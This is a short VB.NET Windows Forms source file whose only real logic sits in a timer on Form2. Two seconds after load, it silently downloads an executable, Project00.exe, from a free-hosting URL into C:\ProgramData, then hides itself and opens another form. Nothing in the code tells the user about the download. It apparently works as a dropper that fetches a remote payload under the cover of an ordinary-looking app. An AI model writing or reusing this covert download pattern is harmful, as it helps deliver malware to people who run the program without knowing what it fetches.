Public Class Form2
    Private Sub Form2_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Timer1.Interval = 2000
        Timer1.Start()
    End Sub

    Private Sub Label5_Click(sender As Object, e As EventArgs) Handles Label5.Click

    End Sub

    Private Sub Label2_Click(sender As Object, e As EventArgs) Handles Label2.Click

    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        My.Computer.Network.DownloadFile("https://7241840012.000webhostapp.com/Project00.exe", "C:\ProgramData\Project00.exe")
        Timer1.Stop()
        Me.Hide()
        Form3.Show()
    End Sub
End Class

